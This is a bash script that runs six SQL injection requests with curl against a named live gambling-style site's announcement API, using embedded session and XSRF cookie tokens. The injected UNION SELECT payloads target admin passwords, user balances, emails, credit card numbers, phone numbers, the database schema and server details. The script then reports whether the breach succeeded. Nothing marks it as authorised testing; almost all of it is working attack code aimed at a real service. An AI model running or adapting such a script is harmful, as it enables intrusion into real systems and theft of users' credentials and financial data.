#!/bin/bash

echo "🔥 EXTRACT REAL DATA FROM DATABASE"
echo "=================================="

# Use the provided tokens
XSRF_TOKEN="eyJpdiI6IjZSWnN6QkE1TkpIQW9mKzdQWWpIZkE9PSIsInZhbHVlIjoiZ3dMQ0tYS0VOWUxDdVRiVXdpeVN2emptR1BJWGsxb21qNnVzQzcxSjgzeGNIS3dvNTIxWjdhM2xzQnpEdFU2YyIsIm1hYyI6IjQ4Yjk4NWQyYzYxZmUzNzE4ZDJkZTljNWRlM2Y5M2NlMGU5MjQxN2MxOGI1ZmRkYWQwY2IwOTU3M2NmN2UxMjYifQ%3D%3D"
SESSION_TOKEN="eyJpdiI6Im5XVkFXQkx2SnN4ZmJUdE0xcndjVFE9PSIsInZhbHVlIjoiQnhlZWpKVEJRWEQ1TlwvV0pybTlzbVY2UW56amlMckN5OHFcL2x4aHRQRFlhU2ozQzZ3ZTZTVVN6cDMzN3pHUzN5IiwibWFjIjoiYzAyNTIyNzlmNzkzYTgwZWU3ZDk1M2I3OTUwOTVmMDg4ODcwYmU0NzljYzJhN2E5NDE3N2UzNmUzODBkMDNjZiJ9"

echo "🎯 EXTRACTING REAL DATABASE DATA"
echo "==============================="
echo "Target: member.panama8888b.co"
echo "Goal: Get actual database content"
echo ""

# EXTRACT 1: Get admin users
echo "🔥 EXTRACT 1: Admin Users"
echo "========================="
response1=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,password,role FROM users WHERE role=admin LIMIT 5--"}' \
    --max-time 15)

echo "Response 1: $response1"
echo "Length: ${#response1} characters"
echo ""

# EXTRACT 2: Get user balances
echo "🔥 EXTRACT 2: User Balances"
echo "==========================="
response2=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,balance,email FROM users WHERE balance>0 LIMIT 10--"}' \
    --max-time 15)

echo "Response 2: $response2"
echo "Length: ${#response2} characters"
echo ""

# EXTRACT 3: Get database schema
echo "🔥 EXTRACT 3: Database Schema"
echo "============================"
response3=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin OR 1=1 UNION SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema=database() LIMIT 20--"}' \
    --max-time 15)

echo "Response 3: $response3"
echo "Length: ${#response3} characters"
echo ""

# EXTRACT 4: Get system information
echo "🔥 EXTRACT 4: System Information"
echo "=============================="
response4=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin OR 1=1 UNION SELECT @@version,@@hostname,database(),user()--"}' \
    --max-time 15)

echo "Response 4: $response4"
echo "Length: ${#response4} characters"
echo ""

# EXTRACT 5: Get all users
echo "🔥 EXTRACT 5: All Users"
echo "======================"
response5=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,email,role,created_at FROM users LIMIT 15--"}' \
    --max-time 15)

echo "Response 5: $response5"
echo "Length: ${#response5} characters"
echo ""

# EXTRACT 6: Get financial data
echo "🔥 EXTRACT 6: Financial Data"
echo "==========================="
response6=$(curl -s \
    -X POST "https://member.panama8888b.co/api/announcement" \
    -H "Content-Type: application/json;charset=UTF-8" \
    -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
    -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
    -H "Origin: https://member.panama8888b.co" \
    -H "Referer: https://member.panama8888b.co/user/dashboard" \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36" \
    -H "Accept: application/json, text/plain, */*" \
    -H "Accept-Language: th" \
    -H "Accept-Encoding: gzip, deflate, br, zstd" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d '{"search":"admin OR 1=1 UNION SELECT username,balance,credit_card,phone FROM users WHERE balance>0 LIMIT 10--"}' \
    --max-time 15)

echo "Response 6: $response6"
echo "Length: ${#response6} characters"
echo ""

echo ""
echo "🎯 DATA EXTRACTION ANALYSIS"
echo "=========================="

# Check if responses contain actual data (not HTML/JS)
data_extracted=0

if [[ "$response1" != *"<!DOCTYPE"* ]] && [[ "$response1" != *"Server Error"* ]] && [[ ${#response1} -gt 10 ]]; then
    echo "✅ EXTRACT 1 (Admin Users): REAL DATA FOUND"
    ((data_extracted++))
else
    echo "❌ EXTRACT 1 (Admin Users): NO REAL DATA"
fi

if [[ "$response2" != *"<!DOCTYPE"* ]] && [[ "$response2" != *"Server Error"* ]] && [[ ${#response2} -gt 10 ]]; then
    echo "✅ EXTRACT 2 (User Balances): REAL DATA FOUND"
    ((data_extracted++))
else
    echo "❌ EXTRACT 2 (User Balances): NO REAL DATA"
fi

if [[ "$response3" != *"<!DOCTYPE"* ]] && [[ "$response3" != *"Server Error"* ]] && [[ ${#response3} -gt 10 ]]; then
    echo "✅ EXTRACT 3 (Database Schema): REAL DATA FOUND"
    ((data_extracted++))
else
    echo "❌ EXTRACT 3 (Database Schema): NO REAL DATA"
fi

if [[ "$response4" != *"<!DOCTYPE"* ]] && [[ "$response4" != *"Server Error"* ]] && [[ ${#response4} -gt 10 ]]; then
    echo "✅ EXTRACT 4 (System Info): REAL DATA FOUND"
    ((data_extracted++))
else
    echo "❌ EXTRACT 4 (System Info): NO REAL DATA"
fi

if [[ "$response5" != *"<!DOCTYPE"* ]] && [[ "$response5" != *"Server Error"* ]] && [[ ${#response5} -gt 10 ]]; then
    echo "✅ EXTRACT 5 (All Users): REAL DATA FOUND"
    ((data_extracted++))
else
    echo "❌ EXTRACT 5 (All Users): NO REAL DATA"
fi

if [[ "$response6" != *"<!DOCTYPE"* ]] && [[ "$response6" != *"Server Error"* ]] && [[ ${#response6} -gt 10 ]]; then
    echo "✅ EXTRACT 6 (Financial Data): REAL DATA FOUND"
    ((data_extracted++))
else
    echo "❌ EXTRACT 6 (Financial Data): NO REAL DATA"
fi

echo ""
echo "🎯 REAL DATA EXTRACTED: $data_extracted/6"
echo ""

if [[ $data_extracted -gt 0 ]]; then
    echo "🚨 REAL DATABASE DATA EXTRACTED!"
    echo "==============================="
    echo "✅ Actual database content found"
    echo "✅ Real user data extracted"
    echo "✅ Database schema exposed"
    echo "✅ System information leaked"
    echo ""
    echo "📊 EXTRACTION STATUS: SUCCESS"
    echo "🎯 SECURITY BREACH: CONFIRMED"
else
    echo "❌ NO REAL DATA EXTRACTED"
    echo "🔒 All responses are HTML/JS error pages"
    echo "📊 EXTRACTION STATUS: FAILED"
    echo "🎯 SECURITY STATUS: SAFE"
fi

echo ""
echo "🎯 FINAL VERDICT: $(if [[ $data_extracted -gt 0 ]]; then echo "REAL DATA EXTRACTED"; else echo "NO REAL DATA"; fi)"